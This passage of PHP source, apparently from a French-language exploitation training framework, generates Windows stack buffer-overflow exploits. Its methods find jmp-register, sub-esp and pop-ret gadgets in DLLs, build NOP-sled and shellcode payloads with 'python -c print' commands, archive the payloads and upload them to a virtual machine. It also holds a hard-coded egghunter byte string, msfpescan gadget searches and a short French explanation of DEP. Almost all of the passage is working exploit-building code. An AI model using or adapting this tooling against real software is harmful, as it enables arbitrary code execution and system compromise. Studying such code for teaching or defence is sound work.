			$cmd = "python -c 'print $header+\"$addr_reg\"+$footer'";
			$query = "$cmd  | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_add_$jmp_int" . "_$reg_addr" . "." . "$ext_file";
			// payload_check_norme("$shellcode$addr_reg");
			$this->requette($query);
			// $this->bin2debug4payload($cmd);
			// //pause();
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_add_$jmp_int.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_add_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	function ret2stack4win4jmp2reg4sub($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("SUB TO REGISTER ESP and JUMP");
	
		$vmx_name = trim(basename($vmx));
		$vmx_name = str_replace(".vmx", "", $vmx_name);
		$vmem_name = trim(basename($this->file_path));
	
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$this->ssTitre("SHELLCODE SIZE");
		$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
	
		$jmp_int =(int)(($offset_eip - $size_shellcode / 2) / 100);
		$opcode_hex = $this->asm2hex("sub esp, 100");
		$opcode_jmp_reg = $this->asm2hex("jmp esp");
		$this->article("OPCODE SUB", $opcode_hex);
		$this->article("OPCODE JMP ESP", $opcode_jmp_reg);
		$this->article("NOMBRE DE SAUT", $jmp_int);
	
		$nop_repeat =($offset_eip - $header_size -(3 * $jmp_int) - 2 - $size_shellcode);
		$header = "\"$opcode_hex\"*$jmp_int+\"$opcode_jmp_reg\"+\"$nop\"*$nop_repeat+\"$shellcode\"";
		$junk_repeat = $exploit_size_max -($offset_eip + 4 + $footer_size);
		$footer = "\"$junk\"*$junk_repeat+\"$footer\"";
	
		$this->article("template", "python -c 'print \"SUB ESP\"+\"JMP ESP\"+\"\\x90\"*(\"OFFSET EIP-len(\"SUB ESP + JMP ESP + SIZE SHELLCODE\"))+\"SHELLCODE\"+\"EIP = JMP REG\"+\"JUNK\"+\"FOOTER\"'");
	
		$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
		$total_reg = count($tab_reg);
		for($i = 0; $i < $total_reg; $i ++) {
			$reg_addr = trim($tab_reg [$i]);
			$addr_reg = $this->hex2rev_32($reg_addr);
			$this->article("$i/$total_reg - $reg", $reg_addr);
			$cmd = "python -c 'print $header+\"$addr_reg\"+$footer'";
			$query = "$cmd  | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_sub_$jmp_int" . "_$reg_addr" . "." . "$ext_file";
			// payload_check_norme("$shellcode$addr_reg");
			$this->requette($query);
			// $this->bin2debug4payload($cmd);
			// //pause();
		}
	
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_sub.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_sub_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	
	/*
	 * // remplacer par ret2stack4win4jmp2reg a VRF avant delete
	 * function payload_stack_win_jmp_ebx_sc_before_only($this->file_rep,$this->file_path,$offset_eip,$dll,$header,$shellcode,$footer,$exploit_size_max,$vmx,$login,$password,$vmem,$profile,$ext_file,$victime_host,$victime_port)
	 * {
	 *
	 * chapitre("JMP EBX SC BEFORE ONLY");
	 *
	 * $nop = "\\x90";
	 * $junk = "\\x41";
	 *
	 * $vmx_name = trim(basename($vmx));
	 * $vmx_name = str_replace(".vmx", "", $vmx_name);
	 * $vmem_name = trim(basename($this->file_path));
	 *
	 * article("template","python -c 'print \"\\x90\"*(\"OFFSET EIP\"-len(\"SHELLCODE\")+\"SHELLCODE\"+\"JMP EBX\"+\"FOOTER\"'");
	 * $shellcode_size = $this->hex2size($shellcode);
	 * $header_size = $this->hex2size($header);
	 * $footer_size = $this->hex2size($footer);
	 * $offset_eip = $offset_eip + $header_size ;
	 * $offset_nop = $offset_eip-$shellcode_size-$header_size;
	 * $header = "\"$nop\"*$offset_nop+\"$shellcode\"";
	 * $footer = "\"$junk\"*($exploit_size_max-$offset_eip-4-$footer_size)";
	 *
	 *
	 * $JMPs_ebx = $vm_machine->vm4jmp2reg($rep_path,"ebx",$vmx, $this->file_path, $dll);
	 * $i=1;
	 * $total_ebx = count($JMPs_ebx) ;
	 * foreach($JMPs_ebx as $addr_jmp_ebx_sc_before_only)
	 	* {
	 	* $addr_jmp_ebx_sc_before_only = trim($addr_jmp_ebx_sc_before_only);
	 	* if(!empty($addr_jmp_ebx_sc_before_only)) {
	 	* article("$i/$total_ebx: JMP ebx",$addr_jmp_ebx_sc_before_only);
	 	* $jmp_ebx_sc_before_only = $this->hex2rev_32($addr_jmp_ebx_sc_before_only);
	 	* $payload = "$header+\"$jmp_ebx_sc_before_only\"+$footer" ;
	 	* //$payload = addcslashes($payload,'\\$');
	 	* $query_jmp_ebx_sc_before_only = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path"."_jmp_ebx_sc_before_only_"."$addr_jmp_ebx_sc_before_only"."."."$ext_file";
	 	* requette($query_jmp_ebx_sc_before_only);
	 	* }
	 	* $i++;
	 	* }
	 * //pause();
	 * ssTitre("Compressing and Uploading Exploits");
	 * $exploit_archive = "exploit_ret2stack4win_$this->file_path"."_jmp_ebx_sc_before_only.tar";
	 * requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path"."_jmp_ebx_sc_before_only_*".".$ext_file ");
	 *
	 * $host = $vmx_name;
	 * $file = "$rep_path/$exploit_archive";
	 * $dest = "C:\\\\tmp\\\\$exploit_archive";
	 * vm_upload($host,$file,$dest);
	 *
	 * }
	 * ################################################################################################################
	 */
	 function ret2stack4win4jmp2reg4offset($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("ADD TO REGISTER $reg and JUMP");
	
	 	$this->article("jmp [reg + offset]", "If there is a register that points to the buffer containing the shellcode,
	 but it does not point at the beginning of the shellcode, you can also try to find an instruction in one of the OS or application dll’s,
	 which will add the required bytes to the register and then jumps to the register.");
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	 	$this->ssTitre("SHELLCODE SIZE");
	 	$size_shellcode = $this->hex2size($shellcode);
	 	$this->ssTitre("HEADER SIZE");
	 	$header_size = $this->hex2size($header);
	 	$this->ssTitre("FOOTER SIZE");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	
	 	/*
	 	 * if($dist_jmp_reg_offset>$offset_eip) {
	 	 * $header1 = "\"$nop\"*($offset_eip-4)+\"$addr_jmp_reg_offset\"";
	 	 * $nop_repeat = $exploit_size_max-($offset_eip+4+$size_shellcode+$footer_size);
	 	 * $footer1 = "\"$nop\"*$nop_repeat+\"$shellcode\"+\"$footer\"" ;
	 	 * }
	 	 */
	
	 	$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	 	$total_reg = count($tab_reg);
	
	 	$tab_jmp_reg_offset = win_get_jmp_reg_offset($rep_path,$reg, $vmx, $login, $password, $this->file_path, $dll);
	 	foreach($tab_jmp_reg_offset as $var_jmp_reg_offset) {
	 		list($addr_jmp_reg_offset, $dist_jmp_reg_offset) = explode(":", $var_jmp_reg_offset);
	 		$dist_jmp_reg_offset = hexdec($dist_jmp_reg_offset);
	 		$this->article("JMP $reg at $addr_jmp_reg_offset + Offset", $dist_jmp_reg_offset);
	 		if($dist_jmp_reg_offset <($offset_eip - $size_shellcode)) {
	 			$nop_repeat =($offset_eip - $size_shellcode - 4);
	 			$header1 = "\"$addr_jmp_reg_offset\"+\"$nop\"*$nop_repeat+\"$shellcode\"";
	 			$junk_repeat = $exploit_size_max -($offset_eip + 4 + $footer_size);
	 			$footer1 = "\"$junk\"*$junk_repeat+\"$footer\"";
	 				
	 			$this->article("template", "python -c 'print \"JMP REG OFFSET\"+\"\\x90\"*(\"OFFSET EIP-len(\"JMP REG OFFSET\")-len(\"SHELLCODE\"))+\"SHELLCODE\"+\"EIP = JMP REG\"+\"JUNK\"+\"FOOTER\"'");
	 			for($i = 0; $i < $total_reg; $i ++) {
	 				$reg_addr = trim($tab_reg [$i]);
	 				$addr_reg = $this->hex2rev_32($reg_addr);
	 				$this->article("$i/$total_reg - $reg", $reg_addr);
	 				$cmd = "python -c 'print $header1+\"$addr_reg\"+$footer1'";
	 				$query = "$cmd | tee exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_offset_$reg_addr" . ".$ext_file";
	 				// payload_check_norme("$shellcode$addr_reg");
	 				$this->requette($query);
	 				// $this->bin2debug4payload($cmd);
	 				// //pause();
	 			}
	 		}
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_offset.tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_offset_*" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	 }

	 
	 function ret2stack4win4jmp2reg4pop1ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("EIP JMP TO REGISTER $reg and POP BEFORE EIP");
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	
	 	$this->ssTitre("SHELLCODE SIZE");
	 	$size_shellcode = $this->hex2size($shellcode);
	 	$this->ssTitre("HEADER SIZE");
	 	$header_size = $this->hex2size($header);
	 	$this->ssTitre("FOOTER SIZE");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	 	$header = "\"$nop\"*($offset_eip-$header_size-4)";
	 	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 4 + $size_shellcode + $footer_size);
	 	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP RET\"))+\"POP RET\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	
	 	$tab_pop = win_get_pop1ret($vmx, $login, $password, $this->file_path, $dll);
	 	$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	 	$total_reg = count($tab_reg);
	 	$total_pop = count($tab_pop);
	 	if($total_pop = 0) {
	 		note("pas de POP RET...sortie");
	 		return 0;
	 	}
	 	for($i = 0; $i < $total_reg; $i ++) {
	 		$reg_addr = trim($tab_reg [$i]);
	 		$addr_reg = $this->hex2rev_32($reg_addr);
	 		for($j = 0; $j < $total_pop; $j ++) {
	 			$pop_addr = trim($tab_pop [$j]);
	 			$addr_pop = $this->hex2rev_32($pop_addr);
	 				
	 			$this->article("$i/$total_reg - $reg", $reg_addr);
	 			$this->article("$j/$total_pop - POP RET", $pop_addr);
	 				
	 			$cmd = "python -c 'print $header+\"$addr_pop\"+\"$addr_reg\"+$footer'";
	 			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop1ret_$pop_addr" . ".$ext_file";
	 			// payload_check_norme("$shellcode$addr_reg");
	 			$this->requette($query);
	 			// $this->bin2debug4payload($cmd);
	 			// //pause();
	 		}
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop1ret.tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop1ret_*" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	 }
	 function ret2stack4win4jmp2reg4pop2ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("EIP JMP TO REGISTER $reg and POP POP RET BEFORE EIP");
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	
	 	$this->ssTitre("SHELLCODE SIZE");
	 	$size_shellcode = $this->hex2size($shellcode);
	 	$this->ssTitre("HEADER SIZE");
	 	$header_size = $this->hex2size($header);
	 	$this->ssTitre("FOOTER SIZE");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	 	$header = "\"$nop\"*($offset_eip-$header_size-8)";
	 	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 8 + $size_shellcode + $footer_size);
	 	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP RET\"))+\"POP RET\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	
	 	$tab_pop = win_get_pop2ret($vmx, $login, $password, $this->file_path, $dll);
	 	$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	 	$total_reg = count($tab_reg);
	 	$total_pop = count($tab_pop);
	 	if($total_pop = 0) {
	 		$this->note("pas de POP POP RET...sortie");
	 		return 0;
	 	}
	 	for($i = 0; $i < $total_reg; $i ++) {
	 		$reg_addr = trim($tab_reg [$i]);
	 		$addr_reg = $this->hex2rev_32($reg_addr);
	 		for($j = 0; $j < $total_pop; $j ++) {
	 			$pop_addr = trim($tab_pop [$j]);
	 			$addr_pop = $this->hex2rev_32($pop_addr);
	 				
	 			$this->article("$i/$total_reg - $reg", $reg_addr);
	 			$this->article("$j/$total_pop - POP POP RET", $pop_addr);
	 				
	 			$cmd = "python -c 'print $header+\"$addr_pop\"+\"BBBB\"+\"$addr_reg\"+$footer'";
	 			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop2ret_$pop_addr" . ".$ext_file";
	 			// payload_check_norme("$shellcode$addr_reg");
	 			$this->requette($query);
	 			// $this->bin2debug4payload($cmd);
	 			// //pause();
	 		}
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop2ret.tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop2ret_*" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	 }
	 function ret2stack4win4jmp2reg4pop3ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("EIP JMP TO REGISTER $reg and POP BEFORE EIP");
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	
	 	$this->ssTitre("SHELLCODE SIZE");
	 	$size_shellcode = $this->hex2size($shellcode);
	 	$this->ssTitre("HEADER SIZE");
	 	$header_size = $this->hex2size($header);
	 	$this->ssTitre("FOOTER SIZE");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	 	$header = "\"$nop\"*($offset_eip-$header_size-4)";
	 	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 12 + $size_shellcode + $footer_size);
	 	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP RET\"))+\"POP RET\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	
	 	$tab_pop = win_get_pop3ret($vmx, $login, $password, $this->file_path, $dll);
	 	$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	 	$total_reg = count($tab_reg);
	 	$total_pop = count($tab_pop);
	 	if($total_pop = 0) {
	 		note("pas de POP POP POP RET...sortie");
	 		return 0;
	 	}
	 	for($i = 0; $i < $total_reg; $i ++) {
	 		$reg_addr = trim($tab_reg [$i]);
	 		$addr_reg = $this->hex2rev_32($reg_addr);
	 		for($j = 0; $j < $total_pop; $j ++) {
	 			$pop_addr = trim($tab_pop [$j]);
	 			$addr_pop = $this->hex2rev_32($pop_addr);
	 				
	 			$this->article("$i/$total_reg - $reg", $reg_addr);
	 			$this->article("$j/$total_pop - POP POP POP RET", $pop_addr);
	 				
	 			$cmd = "python -c 'print $header+\"$addr_pop\"+\"BBBB\"+\"CCCC\"+\"$addr_reg\"+$footer'";
	 			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop3ret_$pop_addr" . ".$ext_file";
	 			// payload_check_norme("$shellcode$addr_reg");
	 			$this->requette($query);
	 			// $this->bin2debug4payload($cmd);
	 			// //pause();
	 		}
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop3ret.tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop3ret_$pop_addr" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	 }
	 function ret2stack4win4jmp2reg4pop8ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("EIP JMP TO REGISTER $reg and POPAD BEFORE EIP");
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	
	 	$this->ssTitre("SHELLCODE SIZE");
	 	$size_shellcode = $this->hex2size($shellcode);
	 	$this->ssTitre("HEADER SIZE");
	 	$header_size = $this->hex2size($header);
	 	$this->ssTitre("FOOTER SIZE");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	 	$header = "\"$nop\"*($offset_eip-$header_size-4)";
	 	$junk_repeat = $exploit_size_max -($offset_eip + 4 + 32 + $size_shellcode + $footer_size);
	 	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"POP RET\"))+\"POP RET\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	
	 	$tab_pop = win_get_pop8ret($vmx, $login, $password, $this->file_path, $dll);
	 	$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	 	$total_reg = count($tab_reg);
	 	$total_pop = count($tab_pop);
	 	if($total_pop = 0) {
	 		note("pas de POPAD...sortie");
	 		return 0;
	 	}
	 	for($i = 0; $i < $total_reg; $i ++) {
	 		$reg_addr = trim($tab_reg [$i]);
	 		$addr_reg = $this->hex2rev_32($reg_addr);
	 		for($j = 0; $j < $total_pop; $j ++) {
	 			$pop_addr = trim($tab_pop [$j]);
	 			$addr_pop = $this->hex2rev_32($pop_addr);
	 				
	 			$this->article("$i/$total_reg - $reg", $reg_addr);
	 			$this->article("$j/$total_pop - POPAD RET", $pop_addr);
	 				
	 			$cmd = "python -c 'print $header+\"$addr_pop\"+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"$addr_reg\"+$footer'";
	 			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop8ret_*" . ".$ext_file";
	 			// payload_check_norme("$shellcode$addr_reg");
	 			$this->requette($query);
	 			// $this->bin2debug4payload($cmd);
	 			// //pause();
	 		}
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop8ret.tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_pop8ret_$pop_addr" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	 }
	 function ret2stack4win4countermeasure_stack_win_DEP() {
	 	$this->article("Not eXecutable Stack", "
	Le buffer overflow dans la pile ayant été l'une des premières techniques d'exploitation découvertes,
	elle généra nombre de réponses, dont certaines plus spécifiques que d'autres.
	Parmi ces réponses, certains proposèrent de rendre les pages mémoire contenant la pile non
	exécutables, puisqu'après tout, la pile est censée contenir des données et non du code. Cette
	technique de protection est connue sous le nom de NX Stack(Not eXecutable Stack).
	si la pile n'était plus exécutable, le tas, ou la section .data le
	restaient et il suffisait d'injecter son shellcode dans ceux-ci, puis de faire, par exemple, un buffer
	overflow dans la pile et réécrire l'adresse de retour d'une fonction vers le shellcode en mémoire
	exécutable.
	
	Une autre idée est alors venue : rendre toutes les pages mémoire pendant l'exécution soit
	inscriptible, soit exécutable, mais jamais les deux. Cette notion d'exclusivité donna son nom à cette
	famille de protection, W étant le symbole pour inscriptible(Writable), X pour exécutable
	(eXecutable), et ^ pour le OU exclusif(XOR) : W^X. Cette dernière protection, assez efficace,
	puisqu'empêchant l'exécution de code injecté dans la mémoire, que ce soit dans la pile, dans le tas,
	ou partout ailleurs, permet cependant toujours la programmation orientée(par retour), puisqu'elle
	tire parti du code déjà présent dans les sections exécutables.
	
	La protection W^X devenue populaire et largement déployée sous de nombreux systèmes
	d'exploitation(sous Windows, cette protection est connue sous le nom de DEP(Data Execution
	Prevention)), les constructeurs de processeurs l'intégrèrent dans leurs produits. Cette protection est
	désormais assurable par le matériel, et connue sous le nom de XD bit chez Intel, EVP(Enhanced
	Virus Protection) chez AMD ou NX bit chez les processeurs ARM.
					");
	 }
	
	 // ###################################################################################################################################
	 function ret2stack4win4jmp2esp4sc_before_jmp_reg($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("JMP ESP SC before JMP reg $reg");
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$this->titre("Shellcode Size");
	 	$shellcode_size = $this->hex2size($shellcode);
	 	$this->titre("Header Size");
	 	$header_size = $this->hex2size($header);
	 	$this->titre("Footer Size");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_header_eip = $offset_eip + $header_size;
	
	 	$JMPs_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)+\"JMP reg\"'");
	
	 	$offset_nop = 10;
	 	$junk_number = $exploit_size_max - $offset_header_eip - 4 - 4 - $offset_nop;
	 	$header = "\"$header\"+\"$nop\"*($offset_header_eip-$shellcode_size)+\"$shellcode\"";
	
	 	$JMPs_ESP = $vm_machine->vm4jmp2reg($rep_path,"esp", $vmx, $this->file_path, $dll);
	 	$i = 1;
	 	$total_esp = count($JMPs_ESP);
	 	foreach($JMPs_ESP as $addr_jmp_esp_sc_before_jmp_reg) {
	 		$addr_jmp_esp_sc_before_jmp_reg = trim($addr_jmp_esp_sc_before_jmp_reg);
	 		if(! empty($addr_jmp_esp_sc_before_jmp_reg)) {
	 			$jmp_esp_sc_before_jmp_reg = $this->hex2rev_32($addr_jmp_esp_sc_before_jmp_reg);
	 			$j = 1;
	 			$total_reg = count($JMPs_reg);
	 			foreach($JMPs_reg as $jmp_reg) {
	 				$jmp_reg = trim($jmp_reg);
	 				$this->article("$i/$total_esp: JMP ESP", $addr_jmp_esp_sc_before_jmp_reg);
	 				$this->article("$j/$total_reg: JMP REG $reg", $jmp_reg);
	 				$jmp_reg_addr = $this->hex2rev_32($jmp_reg);
	 				$footer1 = "\"$nop\"*$offset_nop+\"$jmp_reg_addr\"+\"$junk\"*$junk_number+\"$footer\"";
	 				$payload = "$header+\"$jmp_esp_sc_before_jmp_reg\"+$footer1";
	 				// $payload = addcslashes($payload,'\\$');
	 				$query_jmp_esp_sc_before_jmp_reg = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_jmp_reg_$reg" . "_$addr_jmp_esp_sc_before_jmp_reg" . "_$jmp_reg" . ".$ext_file";
	 				$this->requette($query_jmp_esp_sc_before_jmp_reg);
	 				$j ++;
	 			}
	 		}
	 		$i ++;
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_jmp_reg_" . $reg . ".tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_jmp_reg_$reg" . "_*" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	
	 	return 0;
	
	 	// ################################################
	 	$shellcode_size = $this->hex2size($shellcode);
	 	// egghunter marker w00t
	 	$egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7';
	 	$egghunter_size = $this->hex2size($egghunter);
	 	$egg = "w00tw00t";
	 	$header_size = $this->hex2size($header);
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	 	$nop_repeat = $exploit_size_max - $offset_eip - 4 - $egghunter_size - $footer_size;
	 	$header = "\"$header\"+\"$nop\"*($offset_eip-$header_size-8-$shellcode_size)+\"$egg\"+\"$shellcode\"";
	 	$footer = "\"$nop\"*$nop_repeat+\"$egghunter\"+\"$footer\"";
	
	 	$dlls = vm_download_dll_programme($vmx, $login, $password, $this->file_path, $dll);
	 	if($dll == "all") {
	 		foreach($dlls as $dll_name)
	 			$this->requette("msfpescan -j esp $rep_path/$this->file_path.dll.$dll_name | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | tee $rep_path/$this->file_path.dll.$dll_name.esp ");
	 			$this->requette("cat $rep_path/$this->file_path.dll.*.esp | sort -u |  tee $rep_path/$this->file_path.dll.all.esp");
	 	} else {
	 		$this->requette("msfpescan -j esp $rep_path/$this->file_path.dll.$dll | grep -v '00'  | grep -Po \"0x[a-f0-9A-F]{6,8}\" | tee $rep_path/$this->file_path.dll.$dll.esp ");
	 	}
	
	 	$this->requette("cat $rep_path/$this->file_path.dll.$dll.esp | wc -l "); // pause();
	
	 	$JMPs_ESP = file("$rep_path/$this->file_path.dll.$dll.esp");
	 	foreach($JMPs_ESP as $addr_jmp_esp_sc_before_egghunter) {
	 		$addr_jmp_esp_sc_before_egghunter = trim($addr_jmp_esp_sc_before_egghunter);
	 		if(! empty($addr_jmp_esp_sc_before_egghunter)) {
	 			$this->article("JMP ESP", $addr_jmp_esp_sc_before_egghunter);
